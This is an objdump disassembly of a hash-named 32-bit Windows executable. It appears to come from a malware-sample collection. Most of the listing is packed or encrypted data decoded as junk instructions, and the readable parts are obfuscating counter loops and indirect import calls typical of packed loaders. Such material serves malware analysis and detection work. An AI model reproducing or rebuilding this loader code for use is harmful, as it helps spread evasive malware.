
a32a8bf57b0c78d747060d39fe8f7d1faa9856068b23bf68b5ac440ab9e2c3cc.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x38
  401006:	mov    eax,0x5a3fc98
  40100b:	jmp    0x4011ce
  401010:	inc    DWORD PTR ss:[esi]
  401013:	shl    BYTE PTR [edi-0x1ca60faf],1
  401019:	fs cmp eax,0xce2cda8c
  40101f:	jecxz  0x40109f
  401021:	jle    0x4010a1
  401023:	jle    0x400fbd
  401025:	jg     0x4010a5
  401027:	jle    0x400ff7
  401029:	xlat   BYTE PTR ds:[ebx]
  40102a:	cmp    eax,0xcfd339d5
  40102f:	ror    esi,1
  401031:	pop    es
  401032:	add    al,0x3
  401034:	(bad)  
  401036:	add    BYTE PTR [edi],cl
  401038:	xor    ecx,DWORD PTR [edi]
  40103a:	rcr    BYTE PTR [eax],0xc7
  40103d:	adc    BYTE PTR [edi],bl
  40103f:	mov    ecx,0xddb70058
  401044:	push   cs
  401045:	out    dx,eax
  401046:	mov    ebp,0x8e03d6db
  40104b:	es mov esi,0x1541a2f4
  401051:	lods   eax,DWORD PTR ds:[esi]
  401052:	fiadd  WORD PTR [esi+0x1f]
  401055:	data16 in al,dx
  401057:	outs   dx,DWORD PTR ds:[esi]
  401058:	or     edx,DWORD PTR [ecx]
  40105a:	pushf  
  40105b:	js     0x401033
  40105d:	inc    eax
  40105e:	stos   BYTE PTR es:[edi],al
  40105f:	push   ebx
  401060:	sub    eax,0xad3cc4d1
  401065:	mov    bh,BYTE PTR [ebx-0x3b]
  401068:	stos   DWORD PTR es:[edi],eax
  401069:	push   es
  40106a:	(bad)  
  40106b:	rol    DWORD PTR [ecx+0x3990d6f9],cl
  401071:	jmp    0x4010a3
  401073:	mov    ebp,ecx
  401075:	dec    edi
  401076:	out    0xa6,al
  401078:	inc    ecx
  401079:	call   DWORD PTR [edi-0x2556f868]
  40107f:	mov    ebp,0x5536ed4d
  401084:	and    esi,DWORD PTR [edx-0x43619116]
  40108a:	jnp    0x40109d
  40108c:	ret    
  40108d:	xchg   edx,eax
  40108e:	and    esp,edx
  401090:	jmp    0x4010f0
  401092:	ret    0xb8e4
  401095:	lock jmp 0xd765:0x74cf3192
  40109d:	and    ch,cl
  40109f:	add    bl,cl
  4010a1:	adc    DWORD PTR [ecx-0x5a],edx
  4010a4:	xor    eax,0x78616f03
  4010a9:	or     BYTE PTR [ecx],dh
  4010ab:	fisttp QWORD PTR [esi+0x7f752854]
  4010b1:	(bad)
  4010b6:	or     ebx,DWORD PTR [ebx+0x55]
  4010b9:	fst    st(6)
  4010bb:	or     ebx,edx
  4010bd:	pop    esp
  4010be:	fstp   DWORD PTR [ecx]
  4010c0:	jno    0x401060
  4010c2:	inc    esi
  4010c3:	dec    ebx
  4010c4:	aaa    
  4010c5:	adc    eax,0x1a29772b
  4010ca:	sar    DWORD PTR [esi],cl
  4010cc:	dec    edi
  4010cd:	call   0x6e5ab59e
  4010d2:	call   0xac929470
  4010d7:	pop    ds
  4010d8:	xchg   edi,eax
  4010d9:	and    eax,0x94b84775
  4010de:	aas    
  4010df:	(bad)  
  4010e0:	out    dx,eax
  4010e1:	jg     0x401093
  4010e3:	mov    ch,0x78
  4010e5:	test   eax,0x3da0c79c
  4010ea:	jmp    0x15c36038
  4010ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4010f0:	mov    ebx,0xe370ef9c
  4010f5:	mov    bh,0xa6
  4010f7:	adc    ch,dl
  4010f9:	mov    ebx,0x29213e5e
  4010fe:	rcl    BYTE PTR [ebx],1
  401100:	fucomp st(5)
  401102:	push   cs
  401103:	jecxz  0x4010c2
  401105:	sub    al,0x4d
  401107:	test   al,0xc1
  401109:	and    al,0x89
  40110b:	sub    eax,0x6cad7fa7
  401110:	add    bh,BYTE PTR ds:0x4144075d
  401116:	ss mov ebp,0x47adf901
  40111c:	pop    ss
  40111d:	(bad)  
  40111e:	mov    ecx,0x85627309
  401123:	arpl   cx,dx
  401125:	cmp    DWORD PTR [edx],edi
  401127:	fwait
  401128:	sbb    ch,BYTE PTR [ebp+0x7b]
  40112b:	cmp    DWORD PTR [ebp+0x2f3e7748],eax
  401131:	sbb    DWORD PTR [ecx],edx
  401133:	mov    ebx,0x2c193def
  401138:	out    0xdf,al
  40113a:	push   esi
  40113b:	mov    ch,0xb2
  40113d:	xchg   ecx,eax
  40113e:	cdq    
  40113f:	mov    es,ebx
  401141:	mov    eax,ds:0x91d4b8f9
  401146:	popf   
  401147:	jge    0x4011ae
  401149:	cmp    eax,0x32073c32
  40114e:	cmp    BYTE PTR [ebp+0x4b],ch
  401151:	cmc    
  401152:	pop    ecx
  401153:	push   cs
  401154:	mov    edx,0x553f764c
  401159:	and    dl,cl
  40115b:	or     BYTE PTR [esi+esi*1],0x76
  40115f:	and    ecx,ebx
  401161:	add    DWORD PTR [esi-0x41],0x6089d9c4
  401168:	cs push edx
  40116a:	aad    0xb2
  40116c:	or     esp,DWORD PTR [ebx+0x77]
  40116f:	ss repnz out 0x13,al
  401173:	add    bh,BYTE PTR [ebx-0x2af1feda]
  401179:	call   0x25a8:0x3cb1d143
  401180:	mov    ebx,0xfcdfa510
  401185:	sti    
  401186:	test   edi,esi
  401188:	xchg   DWORD PTR [eax],edi
  40118a:	call   ecx
  40118c:	and    edi,esi
  40118e:	outs   dx,BYTE PTR ds:[esi]
  40118f:	fcmovnbe st,st(1)
  401191:	aam    0x78
  401193:	cld    
  401194:	jo     0x4011c5
  401196:	out    dx,eax
  401197:	sbb    ecx,eax
  401199:	add    eax,0x3c21c080
  40119e:	sar    BYTE PTR [ebx-0x12],0x23
  4011a2:	push   es
  4011a3:	aam    0x6f
  4011a5:	push   ebx
  4011a6:	mov    bh,0xea
  4011a8:	test   BYTE PTR [edx],bh
  4011aa:	hlt    
  4011ab:	cmp    eax,0xb43b1cae
  4011b0:	repz add eax,0xe7e6c8ad
  4011b6:	imul   eax,DWORD PTR [eax+0x71],0x6a
  4011ba:	neg    DWORD PTR [ecx]
  4011bc:	out    0x65,eax
  4011be:	mov    al,ds:0x135a0f81
  4011c3:	fstp   QWORD PTR [ebx]
  4011c5:	or     eax,0x4cbcc5de
  4011ca:	ret    
  4011cb:	pushf  
  4011cc:	cmp    al,0xa6
  4011ce:	mov    DWORD PTR [ebp-0x20],eax
  4011d1:	mov    ecx,0x5d3a
  4011d6:	mov    ecx,DWORD PTR [ebp-0x20]
  4011d9:	mov    DWORD PTR [ebp-0x24],0x4ec1
  4011e0:	cmp    ecx,eax
  4011e2:	jne    0x4020c2
  4011e8:	sbb    ecx,0xfa8
  4011ee:	mov    ax,WORD PTR [ebp-0x24]
  4011f2:	and    DWORD PTR ds:0x4302d5,0x0
  4011fc:	mov    ecx,DWORD PTR ds:0x4302d5
  401202:	inc    ecx
  401203:	mov    DWORD PTR ds:0x4302d5,ecx
  401209:	cmp    DWORD PTR ds:0x4302d5,0xb
  401210:	jne    0x401248
  401216:	push   0x25a9
  40121b:	push   0x3372
  401220:	push   0x5bb7
  401225:	push   DWORD PTR [ebp-0x1c]
  401228:	push   0x6ec1
  40122d:	push   DWORD PTR [ebp-0x28]
  401230:	push   0x3d62
  401235:	push   0x5689
  40123a:	push   DWORD PTR [ebp-0x28]
  40123d:	push   0x7975
  401242:	call   DWORD PTR ds:0x42ea8b
  401248:	cmp    DWORD PTR ds:0x4302d5,0xa
  40124f:	jne    0x401262
  401255:	mov    ecx,DWORD PTR ds:0x4302d5
  40125b:	inc    ecx
  40125c:	mov    DWORD PTR ds:0x4302d5,ecx
  401262:	cmp    DWORD PTR ds:0x4302d5,0x12
  401269:	jb     0x4011fc
  40126f:	mov    DWORD PTR ds:0x4302cd,0x1e
  401279:	cmp    DWORD PTR ds:0x4302cd,0x0
  401280:	je     0x401471
  401286:	cmp    DWORD PTR ds:0x4302cd,0x2d
  40128d:	jne    0x40129c
  401293:	push   DWORD PTR [ebp-0x20]
  401296:	call   DWORD PTR ds:0x42e827
  40129c:	mov    ecx,DWORD PTR ds:0x4302cd
  4012a2:	dec    ecx
  4012a3:	mov    DWORD PTR ds:0x4302cd,ecx
  4012a9:	jmp    0x401279
  4012ae:	jmp    0x401471
  4012b3:	out    0xe8,al
  4012b5:	sub    al,BYTE PTR [ebx]
  4012b7:	xor    cl,al
  4012b9:	imul   ecx
  4012bb:	and    BYTE PTR [ecx],bh
  4012bd:	adc    esi,DWORD PTR [ebx-0x631cce4c]
  4012c3:	cwde   
  4012c4:	jg     0x401344
  4012c6:	jle    0x401260
  4012c8:	jg     0x401348
  4012ca:	jle    0x40124e
  4012cc:	fst    QWORD PTR [ebp+0x43]
  4012cf:	(bad)
  4012d2:	aaa    
  4012d3:	stos   BYTE PTR es:[edi],al
  4012d4:	rol    DWORD PTR [eax-0x6f7edba7],cl
  4012da:	loope  0x40129f
  4012dc:	fiadd  WORD PTR [edx]
  4012de:	or     ah,0xdf
  4012e1:	adc    al,0x9b
  4012e3:	xchg   ecx,eax
  4012e4:	pop    eax
  4012e5:	jmp    0x493aaa45
  4012ea:	push   0x7b008c0f
  4012ef:	in     al,dx
  4012f0:	sahf   
  4012f1:	xchg   BYTE PTR ds:0xd3e34b62,ah
  4012f7:	or     al,0xa
  4012f9:	pop    es
  4012fa:	dec    edx
  4012fb:	dec    ecx
  4012fc:	xlat   BYTE PTR ds:[ebx]
  4012fd:	inc    ecx
  4012fe:	or     BYTE PTR ds:0xa6f02bef,dl
  401304:	gs stos DWORD PTR es:[edi],eax
  401306:	mov    bh,0x6b
  401308:	add    ch,BYTE PTR [ebx]
  40130a:	cmp    al,0x88
  40130c:	adc    eax,0x567aa141
  401311:	mov    DWORD PTR [esi+0x19],edx
  401314:	inc    esi
  401315:	(bad)  
  401317:	and    al,0x7f
  401319:	stos   DWORD PTR es:[edi],eax
  40131a:	xchg   edx,eax
  40131b:	jb     0x4012ea
  40131d:	stos   DWORD PTR es:[edi],eax
  40131e:	xchg   esp,eax
  40131f:	addr16 leave 
  401321:	cmp    edx,ebp
  401323:	xor    ebx,esi
  401325:	inc    edi
  401326:	(bad)  
  401327:	mov    ebp,ebp
  401329:	adc    eax,0x35ff75d2
  40132e:	fcmove st,st(3)
  401330:	(bad)  
  401331:	rcl    esi,cl
  401333:	sahf   
  401334:	xor    eax,0x3c495cf8
  401339:	inc    edx
  40133a:	dec    ecx
  40133b:	lahf   
  40133c:	jmp    0x27230f35
  401341:	stos   DWORD PTR es:[edi],eax
  401342:	jmp    0xd4866126
  401347:	xor    eax,0x7fe38b3d
  40134c:	fwait
  40134d:	jbe    0x4012e7
  40134f:	mov    ch,0x20
  401351:	lock add dl,dh
  401354:	jns    0x40138c
  401356:	pop    es
  401357:	jmp    0x6f9c:0xce0cc67
  40135e:	jecxz  0x4012e0
  401360:	pop    edi
  401361:	popa   
  401362:	out    0x25,eax
  401364:	pushf  
  401365:	stos   DWORD PTR es:[edi],eax
  401366:	and    eax,0x616fa640
  40136b:	lods   al,BYTE PTR ds:[esi]
  40136c:	mov    ebx,0x3ad8e328
  401371:	push   esp
  401372:	jnp    0x4013e1
  401374:	mov    ebx,0x16840493
  401379:	rol    BYTE PTR [ebx+0x33ffa383],cl
  40137f:	out    0xc8,al
  401381:	or     al,bh
  401383:	or     edi,esp
  401385:	imul   ecx,edi,0x21
  401388:	and    al,0x86
  40138a:	repz (bad) 
  40138c:	cmp    bl,BYTE PTR [ebx-0x75]
  40138f:	cmp    ebx,DWORD PTR [esi]
  401391:	xor    BYTE PTR [esi-0x5c],0xb1
  401395:	jnp    0x40134c
  401397:	xor    al,0x21
  401399:	enter  0x40af,0x3a
  40139d:	xchg   esp,eax
  40139e:	add    dl,BYTE PTR [ecx+0x9cb7e8]
  4013a4:	mov    eax,ds:0x364846f9
  4013a9:	aaa    
  4013aa:	hlt    
  4013ab:	adc    DWORD PTR [ebx+0x78],esp
  4013ae:	test   DWORD PTR [edi],eax
  4013b0:	push   DWORD PTR [edx+0x6a66f646]
  4013b6:	nop
  4013b7:	fsub   QWORD PTR [ebx]
  4013b9:	adc    DWORD PTR [edx],edi
  4013bb:	and    eax,0xdcc06ce8
  4013c0:	pop    edx
  4013c1:	dec    ebx
  4013c2:	cmp    al,BYTE PTR [esi-0x449b2ec6]
  4013c8:	stc    
  4013c9:	fcomp  QWORD PTR [ebp+0x10]
  4013cc:	jmp    0x4013fd
  4013ce:	lods   eax,DWORD PTR ds:[esi]
  4013cf:	cmp    dl,BYTE PTR [ebx]
  4013d1:	jns    0x4013d1
  4013d3:	mov    esp,0x6afc4ef3
  4013d8:	adc    DWORD PTR [ebx+0x11],ebx
  4013db:	adc    al,0xde
  4013dd:	pop    ss
  4013de:	adc    edx,DWORD PTR [esi]
  4013e0:	fdiv   st(6),st
  4013e2:	pop    ecx
  4013e3:	push   DWORD PTR [edx-0x38]
  4013e6:	xchg   ecx,eax
  4013e7:	call   0x6ac3:0x5a8e1c0d
  4013ee:	xlat   BYTE PTR ds:[ebx]
  4013ef:	stc    
  4013f0:	cdq    
  4013f1:	add    BYTE PTR [edx],bh
  4013f3:	hlt    
  4013f4:	mov    eax,0xecb6611
  4013f9:	fsubr  DWORD PTR [ebx+0x28]
  4013fc:	mov    eax,ds:0xbbb03604
  401401:	or     al,0x4
  401403:	retf   
  401404:	push   edi
  401405:	sub    edi,eax
  401407:	arpl   WORD PTR [ebx],di
  401409:	sub    ah,BYTE PTR [eax+0x50]
  40140c:	and    BYTE PTR [ecx],bh
  40140e:	adc    cl,dh
  401410:	popa   
  401411:	push   ds
  401412:	loop   0x401462
  401414:	mov    ds:0x5e548746,eax
  401419:	test   BYTE PTR [esi+0x12fc5b68],0xd6
  401420:	jl     0x4013d8
  401422:	jns    0x401403
  401424:	push   edx
  401425:	test   al,0xf5
  401427:	mov    es,WORD PTR [ecx]
  401429:	xor    edx,ecx
  40142b:	dec    ecx
  40142c:	mov    al,ds:0xcbc50306
  401431:	je     0x40143f
  401433:	xchg   dl,cl
  401435:	jmp    0xf3eb62f9
  40143a:	lahf   
  40143b:	push   ebx
  40143c:	shl    edi,0xb5
  40143f:	mov    ch,0x18
  401441:	mov    al,0x4e
  401443:	mov    es,WORD PTR [ebp-0x27]
  401446:	push   ecx
  401447:	xchg   esi,eax
  401448:	into   
  401449:	and    eax,0x3b43f156
  40144e:	aas    
  40144f:	or     BYTE PTR [edi-0x6794fd32],bh
  401455:	fiadd  DWORD PTR [eax]
  401457:	out    0xd4,eax
  401459:	xchg   esp,eax
  40145a:	or     eax,0x85daa94a
  40145f:	(bad)  
  401460:	jecxz  0x4014ac
  401462:	inc    esi
  401463:	pop    ebx
  401464:	jl     0x401414
  401466:	jmp    0x19ba:0xff21e4a3
  40146d:	dec    eax
  40146e:	test   DWORD PTR ds:0x3cb95640,esi
  401474:	mov    al,BYTE PTR [eax]
  401476:	add    BYTE PTR [ecx+0x42ec5b15],al
  40147c:	add    BYTE PTR ds:0x6600002f,bh
  401482:	xor    eax,ecx
  401484:	movzx  esi,WORD PTR ds:0x4302b9
  40148b:	or     DWORD PTR ds:0x43036b,esi
  401491:	mov    ecx,DWORD PTR [ebp+0x8]
  401494:	jmp    0x401657
  401499:	adc    eax,0x716ff192
  40149e:	ins    DWORD PTR es:[edi],dx
  40149f:	xchg   ecx,eax
  4014a0:	jo     0x40144d
  4014a2:	or     eax,0x89c50fff
  4014a7:	fidiv  DWORD PTR [edx+eax*8]
  4014aa:	jge    0x40152a
  4014ac:	jle    0x401446
  4014ae:	jg     0x40152e
  4014b0:	jle    0x4014df
  4014b2:	fwait
  4014b3:	mov    dl,0xb2
  4014b5:	jae    0x4014bd
  4014b7:	add    DWORD PTR ds:0xc3d88bb9,esi
  4014bd:	fsubp  st(0),st
  4014bf:	dec    esp
  4014c0:	inc    esp
  4014c1:	out    0x41,al
  4014c3:	adc    DWORD PTR [edx+0x60c9e33a],0xffffffbc
  4014ca:	and    al,0xce
  4014cc:	adc    eax,0x5c6cd491
  4014d1:	ins    BYTE PTR es:[edi],dx
  4014d2:	mov    ds:0x6a30d2f0,al
  4014d7:	cli    
  4014d8:	popa   
  4014d9:	sub    ebp,ebp
  4014db:	adc    al,0x19
  4014dd:	and    esi,DWORD PTR [edi-0x5b]
  4014e0:	jmp    0x551c:0xc55d667e
  4014e7:	test   eax,0x2f1d5e0b
  4014ec:	pop    ebp
  4014ed:	mov    ds:0x34c1d336,eax
  4014f2:	pop    esi
  4014f3:	jp     0x4014e6
  4014f5:	push   DWORD PTR [eax+esi*8]
  4014f8:	scas   al,BYTE PTR es:[edi]
  4014f9:	lods   eax,DWORD PTR ds:[esi]
  4014fa:	cmp    eax,0x562809ae
  4014ff:	jns    0x401509
  401501:	sbb    cl,0x14
  401504:	xchg   ebx,eax
  401505:	jecxz  0x401555
  401507:	inc    ebx
  401508:	aam    0x9f
  40150a:	sbb    bh,BYTE PTR ds:0xd50dfc01
  401510:	lods   al,BYTE PTR ds:[esi]
  401511:	push   esp
  401512:	(bad)  
  401513:	jb     0x4014a4
  401515:	sbb    ch,BYTE PTR [esi+0x1c]
  401518:	pushf  
  401519:	jp     0x4014ea
  40151b:	mov    ecx,0x612e2941
  401520:	int    0xc5
  401522:	cli    
  401523:	inc    ecx
  401524:	retf   0xf85f
  401527:	icebp  
  401528:	dec    ebx
  401529:	jb     0x40159c
  40152b:	sub    DWORD PTR [esi],edi
  40152d:	inc    edi
  40152e:	xchg   edi,eax
  40152f:	idiv   BYTE PTR [ebp+0x645796e1]
  401535:	jg     0x40152e
  401537:	mov    edi,DWORD PTR [eax]
  401539:	fcomp  DWORD PTR [ebx]
  40153b:	adc    bh,ch
  40153d:	push   edx
  40153e:	mov    edx,0x1dd1550b
  401543:	mov    cl,BYTE PTR [edi+0x61]
  401546:	pusha  
  401547:	mov    ebp,0x24fcdcca
  40154c:	push   0x3c
  40154e:	fnsave [edi+edi*4-0xc0c3c30]
  401555:	or     ah,ah
  401557:	adc    DWORD PTR [edi+0x69],edi
  40155a:	push   cs
  40155b:	push   0xffffffec
  40155d:	sub    ecx,DWORD PTR fs:[eax-0x657e560]
  401564:	mov    dh,0xda
  401566:	jge    0x40150f
  401568:	call   ebp
  40156a:	pusha  
  40156b:	sbb    DWORD PTR [edx-0x73ed2054],edi
  401571:	pop    ecx
  401572:	nop
  401573:	jmp    0x4015d3
  401575:	imul   esi,eax,0xfffffff6
  401578:	pushf  
  401579:	push   0x3b056702
  40157e:	stc    
  40157f:	fcomp  QWORD PTR [ebx-0x6b014e4]
  401585:	or     esp,DWORD PTR [esi]
  401587:	sbb    eax,0x4bb4e8aa
  40158c:	imul   ebp,ebp,0x2c
  40158f:	mov    esp,0x2a9ca241
  401594:	stos   BYTE PTR es:[edi],al
  401595:	ins    BYTE PTR es:[edi],dx
  401596:	jp     0x401615
  401598:	jns    0x40156e
  40159a:	jo     0x40159a
  40159c:	call   0xe6b8643c
  4015a1:	sbb    eax,0xea0bd785
  4015a6:	out    dx,al
  4015a7:	push   0x1d
  4015a9:	mov    eax,ds:0x8223e44f
  4015ae:	or     dh,BYTE PTR [esi+eiz*8+0x40f849bc]
  4015b5:	or     cl,dl
  4015b7:	movmskps eax,xmm3
  4015ba:	lds    edx,FWORD PTR [edi+eiz*2-0x34]
  4015be:	les    edx,FWORD PTR [ebx-0x11bb20c7]
  4015c4:	sub    al,0x42
  4015c7:	fcom   QWORD PTR [edx]
  4015c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4015ca:	stos   DWORD PTR es:[edi],eax
  4015cb:	fcom   DWORD PTR [edx]
  4015cd:	or     eax,0x29eb27de
  4015d2:	test   al,0x5f
  4015d4:	mov    edi,ecx
  4015d6:	pop    ebx
  4015d7:	xchg   BYTE PTR [edx+0x3d],ah
  4015da:	mov    fs,ecx
  4015dc:	dec    esp
  4015dd:	adc    eax,0x22155469
  4015e2:	imul   ebx,DWORD PTR [ebp+0x716f1f06],0x59b67d6a
  4015ec:	call   0x6ddd:0xc5a0bd96
  4015f3:	jge    0x4015b7
  4015f5:	xor    DWORD PTR [ebp-0x39166b2],ebp
  4015fb:	scas   eax,DWORD PTR es:[edi]
  4015fc:	lock fisttp WORD PTR [ebx-0x59]
  401600:	add    BYTE PTR [edx],dl
  401602:	aad    0xda
  401604:	je     0x4015bd
  401606:	or     BYTE PTR [ebp-0x4e90e168],0xfb
  40160d:	push   ds
  40160e:	push   ebx
  40160f:	rol    BYTE PTR [ebx],1
  401611:	add    DWORD PTR ds:0x93240fce,0xb
  401618:	xchg   ebx,eax
  401619:	ins    BYTE PTR es:[edi],dx
  40161a:	xor    eax,0x3dda7496
  40161f:	push   esi
  401620:	mov    ebx,0x32c9b184
  401625:	or     eax,0x34fdcce7
  40162a:	add    al,0x97
  40162c:	xor    BYTE PTR [edi+0x6b],dl
  40162f:	(bad)  
  401633:	shl    eax,0xcf
  401636:	sub    DWORD PTR [ecx-0x4bf233d3],edi
  40163c:	dec    esp
  40163d:	mov    ds:0x4e0eebcf,al
  401642:	mov    edx,0xa96047ca
  401647:	sbb    BYTE PTR [eax-0x16],0x53
  40164b:	stos   DWORD PTR es:[edi],eax
  40164c:	adc    eax,0x1818483a
  401651:	mov    BYTE PTR [edi+0x78ebb143],bl
  401657:	push   edi
  401658:	and    esi,edi
  40165a:	jmp    0x40181d
  40165f:	push   cs
  401660:	and    BYTE PTR [edi],dh
  401662:	pop    ebp
  401663:	xor    DWORD PTR [ecx+0x54],ebp
  401666:	jno    0x4016b3
  401668:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401669:	cmp    BYTE PTR [edi],bl
  40166b:	push   cs
  40166c:	(bad)  
  40166d:	out    dx,eax
  40166e:	test   eax,0x7e7e7a6c
  401673:	cwde   
  401674:	jg     0x4016f4
  401676:	jle    0x401678
  401678:	es enter 0x25a0,0x4b
  40167d:	lds    eax,FWORD PTR [eax]
  40167f:	push   esp
  401680:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401681:	pusha  
  401682:	sbb    al,0xe1
  401684:	jnp    0x401631
  401686:	sub    ch,BYTE PTR [ebx-0x69f023b6]
  40168c:	dec    eax
  40168d:	pop    eax
  40168e:	shl    DWORD PTR [ebx-0x39],1
  401691:	sbb    al,BYTE PTR [ecx+edi*4]
  401694:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401695:	xor    eax,0x895201ec
  40169a:	cdq    
  40169b:	retf   0x6085
  40169e:	jne    0x4016c6
  4016a0:	sub    al,0x29
  4016a2:	sub    ebp,ebx
  4016a4:	add    ch,cl
  4016a6:	les    esp,FWORD PTR [eax+0x2c]
  4016a9:	pusha  
  4016aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4016ab:	xchg   ebp,eax
  4016ac:	sub    cl,BYTE PTR [eax]
  4016ae:	fdiv   QWORD PTR [ebp+0x6e]
  4016b1:	in     eax,dx
  4016b2:	pop    ecx
  4016b3:	test   eax,0xc80f3ca4
  4016b8:	cdq    
  4016b9:	gs ins BYTE PTR es:[edi],dx
  4016bb:	mov    eax,0x8e45c659
  4016c0:	retf   
  4016c1:	inc    ebx
  4016c2:	mov    DWORD PTR [ecx+ebp*8+0x7bacbf06],eax
  4016c9:	mov    bh,BYTE PTR [edx+edx*4+0x1ce8ee7e]
  4016d0:	ja     0x40165b
  4016d2:	(bad)  
  4016d3:	lds    edx,FWORD PTR [esi+0x36]
  4016d6:	leave  
  4016d7:	hlt    
  4016d8:	inc    edx
  4016d9:	sub    DWORD PTR ds:0x885eea2d,ecx
  4016df:	ins    BYTE PTR es:[edi],dx
  4016e0:	retf   0xb626
  4016e3:	addr16 mov ecx,0xb10b0716
  4016e9:	xchg   esp,eax
  4016ea:	pop    edx
  4016eb:	jge    0x4016c1
  4016ed:	cmp    eax,DWORD PTR [esi+edx*1+0x5404ede2]
  4016f4:	pop    ebx
  4016f5:	and    eax,0x4401e7b0
  4016fa:	cs push 0x5484acbc
  401700:	sub    BYTE PTR [esi],ah
  401702:	fs push edx
  401704:	mov    bl,0xbd
  401706:	or     eax,0x7a3df231
  40170b:	shl    BYTE PTR [ecx+0x75094aeb],cl
  401711:	inc    ebx
  401712:	shl    edx,cl
  401714:	pop    eax
  401715:	aaa    
  401716:	add    al,bh
  401718:	cld    
  401719:	loop   0x401795
  40171b:	pop    edi
  40171c:	outs   dx,DWORD PTR ds:[esi]
  40171d:	retf   
  40171e:	sbb    BYTE PTR [edx+esi*2],bh
  401721:	push   ss
  401722:	push   edi
  401723:	(bad)  
  401724:	out    dx,al
  401725:	pusha  
  401726:	ins    DWORD PTR es:[edi],dx
  401727:	mov    eax,ds:0x5ca05a0c
  40172c:	(bad)  
  40172d:	or     DWORD PTR [esi],edx
  40172f:	sub    dl,BYTE PTR [esi+0x1f167f82]
  401735:	push   esi
  401736:	sbb    dh,BYTE PTR [ebx]
  401738:	cld    
  401739:	je     0x401737
  40173b:	dec    esp
  40173c:	popa   
  40173d:	jns    0x401722
  40173f:	cdq    
  401740:	inc    eax
  401741:	sub    BYTE PTR [esi+0x1a2617b0],bh
  401747:	cmp    BYTE PTR [esi+0x132183e7],dh
  40174d:	cmp    BYTE PTR [edx-0x4ede73a5],bl
  401753:	stos   BYTE PTR es:[edi],al
  401754:	xchg   edx,eax
  401755:	rcl    BYTE PTR [edx],cl
  401757:	mov    DWORD PTR [esp+ebp*2-0x4d],ebp
  40175b:	mov    ds:0xe6c3ed6,al
  401760:	addr16 dec edi
  401762:	ss sub esp,esi
  401765:	lahf   
  401766:	cwde   
  401767:	sbb    esp,DWORD PTR [ebx+0x5b]
  40176a:	cmp    al,0x6d
  40176c:	push   esi
  40176d:	and    ebp,esp
  40176f:	shr    ebx,1
  401771:	mov    edx,0x9d59290b
  401776:	pop    ss
  401777:	jae    0x401710
  401779:	push   edx
  40177a:	and    dh,dh
  40177c:	leave  
  40177d:	lahf   
  40177e:	fisubr WORD PTR [edi-0xf]
  401781:	arpl   WORD PTR [eax-0x14],sp
  401784:	call   0xc04737cc
  401789:	dec    esi
  40178a:	test   DWORD PTR [eax-0x7],0x56abc215
  401791:	fsubr  st(4),st
  401793:	sbb    al,0xad
  401795:	jp     0x401793
  401797:	mov    dl,0x8c
  401799:	lods   eax,DWORD PTR ds:[esi]
  40179a:	(bad)
  40179e:	pop    edi
  40179f:	fcom   DWORD PTR [eax+0x2ea22296]
  4017a5:	outs   dx,BYTE PTR ds:[esi]
  4017a6:	adc    DWORD PTR [ebx-0x37],ebp
  4017a9:	push   0x2
  4017ab:	shr    BYTE PTR [edx-0x4a9c2854],cl
  4017b1:	call   0xdd7849e3
  4017b6:	pop    ds
  4017b7:	mov    al,ds:0xe05f6add
  4017bc:	inc    ebp
  4017bd:	in     eax,dx
  4017be:	inc    ebp
  4017bf:	xor    edx,ecx
  4017c1:	outs   dx,BYTE PTR ds:[esi]
  4017c2:	jmp    0x4017f6
  4017c4:	nop
  4017c5:	mov    ch,BYTE PTR [ebx-0x30172ce5]
  4017cb:	(bad)  [esi+eax*2-0x77]
  4017cf:	arpl   WORD PTR [eax-0x1378a408],cx
  4017d5:	bound  edx,QWORD PTR [ecx]
  4017d7:	fdivr  QWORD PTR [edx]
  4017d9:	mov    ebx,0x6f27c6a4
  4017de:	imul   ecx,edx,0xfffffff8
  4017e1:	mov    esi,0xb870a9cc
  4017e6:	cmp    DWORD PTR [edi+edx*4-0x3a],0x3b0e64ad
  4017ee:	mov    bl,BYTE PTR [ecx-0x3a780174]
  4017f4:	dec    ecx
  4017f5:	mov    ds:0xfe017493,al
  4017fa:	ret    
  4017fb:	xchg   ebp,eax
  4017fc:	mov    edi,0xa8f349f9
  401801:	test   DWORD PTR [ebp+0x6a840d2b],edx
  401807:	mov    cs,WORD PTR [ebp-0x66]
  40180a:	aam    0xf1
  40180c:	out    0xdc,al
  40180e:	stos   DWORD PTR es:[edi],eax
  40180f:	push   ebx
  401810:	sub    BYTE PTR [edi-0x68],dh
  401813:	mov    ds:0x4a269110,al
  401818:	lods   al,BYTE PTR ds:[esi]
  401819:	loopne 0x4017bd
  40181b:	cmp    DWORD PTR [ebp-0x41],edx
  40181e:	add    bh,BYTE PTR [ebx]
  401820:	add    BYTE PTR [eax],al
  401822:	add    ax,di
  401825:	mov    DWORD PTR ds:0x4302d5,0x60d8
  40182f:	movzx  eax,ax
  401832:	and    DWORD PTR ds:0x4302d9,0x0
  40183c:	mov    esi,DWORD PTR ds:0x4302d9
  401842:	inc    esi
  401843:	mov    DWORD PTR ds:0x4302d9,esi
  401849:	cmp    DWORD PTR ds:0x4302d9,0x1d
  401850:	jne    0x401863
  401856:	push   0x0
  401858:	push   0x21fd
  40185d:	call   DWORD PTR ds:0x42e913
  401863:	cmp    DWORD PTR ds:0x4302d9,0x10
  40186a:	jb     0x40183c
  401870:	sbb    esi,0x67dd
  401876:	not    eax
  401878:	and    eax,DWORD PTR [ecx]
  40187a:	and    DWORD PTR ds:0x430363,0x0
  401884:	jmp    0x401898
  401889:	xor    esi,esi
  40188b:	xor    esi,DWORD PTR ds:0x430363
  401891:	inc    esi
  401892:	mov    DWORD PTR ds:0x430363,esi
  401898:	cmp    DWORD PTR ds:0x430363,0x1b
  40189f:	jae    0x4018dc
  4018a5:	cmp    DWORD PTR ds:0x430363,0x8
  4018ac:	jne    0x4018bd
  4018b2:	push   0x780b
  4018b7:	call   DWORD PTR ds:0x42e82b
  4018bd:	cmp    DWORD PTR ds:0x430363,0x7
  4018c4:	jne    0x4018d7
  4018ca:	mov    esi,DWORD PTR ds:0x430363
  4018d0:	inc    esi
  4018d1:	mov    DWORD PTR ds:0x430363,esi
  4018d7:	jmp    0x401889
